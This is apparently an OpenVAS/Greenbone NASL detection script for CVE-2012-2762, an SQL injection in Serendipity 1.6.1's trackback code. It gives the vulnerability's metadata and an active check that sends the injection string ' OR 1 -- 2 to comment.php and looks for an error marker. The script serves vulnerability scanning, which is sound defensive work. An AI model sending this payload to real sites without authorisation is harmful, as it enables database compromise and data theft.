CPE = "cpe:/a:s9y:serendipity";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103526" );
	script_bugtraq_id( 53620 );
	script_cve_id( "CVE-2012-2762" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "$Revision: 11072 $" );
	script_name( "Serendipity 'functions_trackbacks.inc.php' SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/53620" );
	script_xref( name: "URL", value: "https://github.com/s9y/Serendipity/commit/87153991d06bc18fe4af05f97810487c4a340a92#diff-1" );
	script_xref( name: "URL", value: "http://blog.s9y.org/archives/241-Serendipity-1.6.2-released.html" );
	script_xref( name: "URL", value: "http://www.s9y.org/" );
	script_xref( name: "URL", value: "https://www.htbridge.com/advisory/HTB23092" );
	script_tag( name: "last_modification", value: "$Date: 2018-08-21 16:38:15 +0200 (Tue, 21 Aug 2018) $" );
	script_tag( name: "creation_date", value: "2012-07-25 14:02:47 +0200 (Wed, 25 Jul 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_active" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "serendipity_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Serendipity/installed" );
	script_tag( name: "solution", value: "Updates are available, please see the references for details." );
	script_tag( name: "summary", value: "Serendipity is prone to an SQL-injection vulnerability because it
fails to sufficiently sanitize user-supplied data before using it in
an SQL query." );
	script_tag( name: "impact", value: "A successful exploit may allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database." );
	script_tag( name: "affected", value: "Serendipity 1.6.1 is vulnerable, other versions may also be affected." );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/comment.php?type=trackback&entry_id=1&url=%27%20OR%201%20--%202";
if(http_vuln_check( port: port, url: url, pattern: "<error>1</error>", extra_check: "trackback failed" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

